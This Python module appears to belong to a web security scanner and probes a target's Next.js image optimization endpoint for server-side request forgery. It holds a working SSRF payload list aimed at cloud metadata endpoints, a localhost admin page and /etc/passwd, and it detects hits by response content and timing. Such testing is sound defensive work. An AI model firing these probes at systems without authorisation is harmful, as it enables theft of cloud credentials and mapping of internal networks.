from typing import Any, Dict
from ..http_client import HttpClient
from ..scenarios import SimpleScenario

def run_ssr_ssrf(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """
    RSC Framework-Level SSRF.
    
    Attempts to coerce Server Actions or SSR fetches into referencing internal infrastructure.
    This bypasses WAFs because it looks like valid application traffic (fetching an image/resource).
    """
    
    issues = []
    evidence = []
    
    # Common internal targets
    targets = [
        "http://169.254.169.254/latest/meta-data/", # AWS
        "http://metadata.google.internal/computeMetadata/v1/", # GCP
        "http://127.0.0.1:8080/admin",
        "file:///etc/passwd"
    ]
    
    # Payload injection points for SSRF in modern frameworks:
    # 1. Image Optimization paths (Next.js /_next/image?url=...)
    # 2. Server Action return URLs or callback fields.
    
    # Checks specific to Next.js Image Optimization API (common SSRF vector)
    base = scenario.target.rstrip('/')
    image_endpoint = f"{base}/_next/image"
    
    for t in targets:
        # Try Image Optimization SSRF
        params = {"url": t, "w": "128", "q": "75"}
        resp = client.send("GET", image_endpoint, params=params)
        
        if resp.status_code in [200, 500]:
            # If 200, we got the data (CRITICAL)
            # If 500, we tried to process it (Timeouts often indicate it tried to connect)
            
            if resp.status_code == 200 and ("ami-id" in resp.text or "root:" in resp.text or "Admin" in resp.text):
                issues.append(f"Confirmed SSRF via Image Optimization. Accessed: {t}")
                evidence.append(resp.text[:200])
            
            elif resp.elapsed_ms > 2000:
                # Timing attack: It took long, meaning it likely waited for a connection timeout on the internal network
                issues.append(f"Blind SSRF Timing Logic detected for {t} ({resp.elapsed_ms}ms)")
    
    # Forensic context
    narrative = []
    if issues:
        narrative.append("Risk: Framework-Level SSRF Detected.")
        narrative.append("Analysis: The application acts as an open proxy or processes internal URLs.")
        narrative.append("Impact: Cloud Metadata theft, Internal Network Scanning.")

    return {
        "scenario_id": scenario.id,
        "attack_type": "rsc_ssr_ssrf",
        "passed": len(issues) == 0,
        "details": {
             "title": "Framework-Level SSRF (Server Actions/Image Opt)",
             "issues": issues,
             "forensic_narrative": narrative,
             "evidence": evidence
        }
    }
